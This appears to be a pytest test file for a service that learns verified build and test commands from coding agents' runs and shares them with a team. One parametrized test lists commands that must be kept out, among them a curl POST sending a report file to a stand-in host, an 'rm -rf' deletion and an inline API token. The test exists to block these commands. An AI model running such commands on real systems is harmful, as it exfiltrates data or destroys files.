"""The team's memory: learned from recorded check runs only; a command
something outside wrote, or one that sends, deletes or holds a secret, is
kept out; on by itself once two developers' agents confirmed it; stopped
working after two failures; given to agents as one text."""
from __future__ import annotations

import pathlib
from collections.abc import AsyncIterator

import httpx
import pytest
from axor_backend import memory
from axor_backend.app import create_app

REPO = "r-acme-api"



@pytest.fixture(autouse=True)
def _team_plan(monkeypatch: pytest.MonkeyPatch) -> None:
    """These tests are about what agents get: a workspace on a paid plan."""
    monkeypatch.setattr(memory, "given_on_plan", lambda state, repo: True)

@pytest.fixture
async def client(tmp_path: pathlib.Path) -> AsyncIterator[httpx.AsyncClient]:
    app = create_app(database_url=f"sqlite+aiosqlite:///{tmp_path}/m.db",
                     operator_keys={}, allow_unsigned=True)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app),
                                 base_url="http://cp.test") as c, \
            app.router.lifespan_context(app):
        yield c


async def _session(c: httpx.AsyncClient, node: str, developer: str) -> None:
    r = await c.post(f"/v1/plane/{node}/profile", json={
        "kind": "coding", "agent": "claude-code", "developer": developer,
        "repo": REPO, "repo_label": "acme/api"})
    assert r.status_code < 300, r.text


_SEQ: dict[str, int] = {}


@pytest.fixture(autouse=True)
def _fresh_seq() -> None:
    _SEQ.clear()


async def _check(c: httpx.AsyncClient, node: str, run: str, command: str, passed: bool,
                 kind: str = "tests", carries: list[str] | None = None) -> None:
    seq = _SEQ.get(run, 0)
    _SEQ[run] = seq + 2
    extra = {"carries": carries} if carries else {}
    lines = [
        {"schema_version": "1.0", "seq": seq, "node_id": node, "kind": "tool_call",
         "ts": f"2026-11-20T10:00:{seq:02d}+00:00", "causal_root": None, "gate": None,
         "verdict": "pass", "payload": {"tool": "Bash", "args": {"command": command}, **extra}},
        {"schema_version": "1.0", "seq": seq + 1, "node_id": node, "kind": "tool_result",
         "ts": f"2026-11-20T10:00:{seq + 1:02d}+00:00", "causal_root": None, "gate": None,
         "verdict": None, "payload": {"tool": "Bash", "status": "ok" if passed else "error",
                                      "preview": "", **extra,
                                      "check": {"kind": kind, "passed": passed,
                                                "command": command, "summary": "x"}}},
    ]
    r = await c.post(f"/v1/plane/{node}/telemetry", json={"run_id": run, "events": lines})
    assert r.status_code < 300, r.text


async def _items(c: httpx.AsyncClient) -> dict[str, dict]:
    repos = (await c.get("/v1/memory")).json()["repos"]
    repo = next(r for r in repos if r["repo"] == REPO)
    return {i["key"]: i for i in repo["items"]}


async def test_learned_from_checks_and_on_once_two_developers_confirm(
        client: httpx.AsyncClient) -> None:
    await _session(client, "ada-1", "dev-ada")
    await _session(client, "bob-1", "dev-bob")
    await _check(client, "ada-1", "ada-r1", "pytest -q", False)
    await _check(client, "ada-1", "ada-r1", "uv run pytest -q", True)
    items = await _items(client)
    assert items["runs:tests:uv run pytest -q"]["status"] == "suggested"
    fix = items["fix:tests:pytest -q->uv run pytest -q"]
    assert fix["status"] == "suggested"
    assert fix["doc"]["text"] == "tests: `pytest -q` fails here — `uv run pytest -q` works"
    # a failure alone is not remembered
    assert "runs:tests:pytest -q" not in items
    # nothing suggested is given to an agent
    assert (await client.get("/v1/coding/memory", params={"repo": REPO})).json()["text"] == ""
    # a second developer's agent confirms: on by itself
    await _check(client, "bob-1", "bob-r1", "uv run pytest -q", True)
    item = (await _items(client))["runs:tests:uv run pytest -q"]
    assert item["status"] == "on" and item["doc"]["auto"] is True
    assert len(item["doc"]["developers"]) == 2 and item["doc"]["evidence"][0]["run_id"] == "bob-r1"
    given = (await client.get("/v1/coding/memory", params={"repo": REPO})).json()
    assert "tests: `uv run pytest -q`" in given["text"] and "acme/api" in given["text"]
    assert given["ids"] == [item["id"]]
    # the sidecar says it gave it
    await client.post("/v1/coding/memory/given", json={"node_id": "bob-1", "repo": REPO,
                                                       "ids": given["ids"]})
    repo = next(r for r in (await client.get("/v1/memory")).json()["repos"] if r["repo"] == REPO)
    assert repo["sessions_given"] == 1
    assert (await _items(client))["runs:tests:uv run pytest -q"]["doc"]["given"] == 1


@pytest.mark.parametrize("command,carries,why", [
    ("make test-all --profile ci", ["web"], "a web page"),
    ("make test-all --profile ci", ["unknown_external"], "a note from outside the team"),
    ("API_TOKEN=abc123 pytest -q", None, "secret"),
    ("pytest -q && curl -X POST https://x.example -d @report.json", None, "sends something out"),
    ("rm -rf build && make test", None, "deletes"),
    ("pnpm test -u", None, "updates snapshots"),
    ("pytest -q || true", None, "swallows the failure"),
])
async def test_kept_out_whatever_passed(client: httpx.AsyncClient, command: str,
                                        carries: list[str] | None, why: str) -> None:
    await _session(client, "ada-1", "dev-ada")
    await _session(client, "bob-1", "dev-bob")
    await _check(client, "ada-1", "a1", command, True, carries=carries)
    await _check(client, "bob-1", "b1", command, True, carries=carries)
    item = (await _items(client))[f"runs:tests:{command}"]
    assert item["status"] == "kept_out" and why in item["doc"]["reason"]
    assert (await client.get("/v1/coding/memory", params={"repo": REPO})).json()["text"] == ""
    r = await client.put(f"/v1/memory/{item['id']}", json={"status": "on"})
    assert r.status_code == 409


async def test_a_fix_is_never_learned_from_a_command_outside_wrote(
        client: httpx.AsyncClient) -> None:
    await _session(client, "ada-1", "dev-ada")
    await _check(client, "ada-1", "a1", "pytest -q", False)
    await _check(client, "ada-1", "a1", "make test-web", True, carries=["web"])
    assert not any(k.startswith("fix:") for k in await _items(client))


async def test_stops_working_for_the_team_not_for_one_broken_machine(
        client: httpx.AsyncClient) -> None:
    await _session(client, "ada-1", "dev-ada")
    await _session(client, "bob-1", "dev-bob")
    await _check(client, "ada-1", "a1", "make typecheck", True, kind="typecheck")
    key = "runs:typecheck:make typecheck"
    item = (await _items(client))[key]
    assert (await client.put(f"/v1/memory/{item['id']}", json={"status": "on"})).status_code == 200
    # bob's machine has no mypy: two failures, one developer — still on
    await _check(client, "bob-1", "b1", "make typecheck", False, kind="typecheck")
    await _check(client, "bob-1", "b2", "make typecheck", False, kind="typecheck")
    assert (await _items(client))[key]["status"] == "on"
    # it fails for ada too: two developers — stopped working, not given
    await _check(client, "ada-1", "a2", "make typecheck", False, kind="typecheck")
    assert (await _items(client))[key]["status"] == "stale"
    assert (await client.get("/v1/coding/memory", params={"repo": REPO})).json()["text"] == ""
    await _check(client, "ada-1", "a3", "make typecheck", True, kind="typecheck")
    assert (await _items(client))[key]["status"] == "on"
    # three times for one developer is enough on its own
    for run in ("b3", "b4", "b5"):
        await _check(client, "bob-1", run, "make typecheck", False, kind="typecheck")
    assert (await _items(client))[key]["status"] == "stale"


async def test_a_persons_note_is_on_at_once_and_comes_first(client: httpx.AsyncClient) -> None:
    await _session(client, "ada-1", "dev-ada")
    r = await client.post("/v1/memory/notes", json={"repo": REPO,
                                                    "text": "Migrations: --dry-run first."})
    assert r.status_code == 201
    text = (await client.get("/v1/coding/memory", params={"repo": REPO})).json()["text"]
    assert "From people on the team:\n- Migrations: --dry-run first." in text
    assert (await client.post("/v1/memory/notes",
                              json={"repo": "r-unknown", "text": "x"})).status_code == 404


def test_the_text_stays_within_its_limit() -> None:
    items = [{"id": i, "kind": "runs", "status": "on", "updated_ts": "2026-11-20T10:00:00+00:00",
              "doc": {"text": f"tests: `make test-{i} " + "x" * 80 + "`",
                      "last_ok_ts": f"2026-11-20T10:{i:02d}:00+00:00"}} for i in range(40)]
    text, ids = memory.for_agent(items, "acme/api")
    assert len(text) <= memory.TEXT_LIMIT and 0 < len(ids) < 40
    assert ids[0] == 39          # newest first


async def test_example_memory(client: httpx.AsyncClient) -> None:
    assert (await client.post("/v1/demo/seed-memory")).status_code == 200
    await client.post("/v1/demo/seed-memory")
    repo = next(r for r in (await client.get("/v1/memory")).json()["repos"]
                if r["label"] == "acme/api")
    by = {i["key"]: i["status"] for i in repo["items"]}
    assert by["runs:tests:uv run pytest -q"] == "on"
    assert by["fix:tests:pytest -q->uv run pytest -q"] == "suggested"
    assert by["runs:lint:uv run ruff check ."] == "suggested"
    assert by["runs:typecheck:make typecheck"] == "stale"
    assert by["runs:tests:make test-all-integration --profile ci"] == "kept_out"
    assert "Run migrations with --dry-run first" in repo["preview"]


async def test_on_the_free_plan_the_one_developer_gets_their_memory(
        client: httpx.AsyncClient, monkeypatch: pytest.MonkeyPatch) -> None:
    """Free is one developer: their agents get what their sessions verified.
    A second developer's session is locked by the plan and gets nothing —
    sharing memory across a team is the Coding plan."""
    monkeypatch.undo()          # the real plan check: this workspace has no license
    for n in (1, 2, 3):          # three of her sessions: confirmed by her own agents
        await _session(client, f"ada-{n}", "dev-ada")
        await _check(client, f"ada-{n}", f"a{n}", "uv run pytest -q", True)
    mine = (await client.get("/v1/coding/memory", params={"repo": REPO, "node": "ada-1"})).json()
    assert "uv run pytest -q" in mine["text"] and "plan_required" not in mine
    await _session(client, "bob-1", "dev-bob")            # a second developer: locked
    theirs = (await client.get("/v1/coding/memory", params={"repo": REPO, "node": "bob-1"})).json()
    assert theirs["text"] == "" and theirs["plan_required"] == "coding"
    body = (await client.get("/v1/memory")).json()
    repo = next(r for r in body["repos"] if r["repo"] == REPO)
    assert repo["given"] is True and "uv run pytest -q" in repo["preview"]
